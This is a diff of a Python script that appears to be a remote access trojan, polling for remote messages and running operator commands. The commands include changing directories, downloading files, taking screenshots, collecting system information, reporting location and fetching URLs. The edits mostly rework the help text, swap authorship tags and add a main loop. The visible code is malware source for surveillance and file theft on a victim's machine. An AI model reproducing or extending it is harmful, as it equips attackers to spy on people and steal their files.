@@ -3,7 +3,6 @@ import platform
 import requests
 import subprocess
 import time
-
 try:
     from PIL import ImageGrab
 except ImportError:
@@ -62,7 +61,6 @@ def execute_command(command):
             return 'Some shit occured'
     elif command == 'info':
         system_info = {
-        
             'Platform': platform.platform(),
             'System': platform.system(),
             'Node Name': platform.node(),
@@ -88,26 +86,15 @@ def execute_command(command):
             return f"Error taking screenshot: {e}"
     elif command == 'help':
         return '''
-                —— {COMMANDS } ——
-                
--------------------------                
-cd 
--------------------------
-cd foldername 
--------------------------
+       [CODED BY 4ZU PH]
+CMD Commands  
+cd ..     
+cd foldername      
 download filename 
--------------------------
-screenshot  
--------------------------      
-info        
--------------------------
-location          
--------------------------
-get url   
--------------------------
-
-
-CODED BY : 4ZU PH | Y3SH4
+screenshot        
+info            
+location            
+get url            
             '''
     elif command.startswith('download '):
         filename = command[
@@ -190,12 +177,8 @@ def main():
             offset = handle_updates(updates) + 1
             processed_message_ids.clear()
         else:
-      
-            print("\033[36mPlease wait...")
-
-#coded by y3sh4 dont copy
-
-    
-    
-
-  
+            print("No updates found.")
+        time.sleep(1)
+if __name__ == '__main__':
+    main()
+#coded by machine1337. Don't copy this code
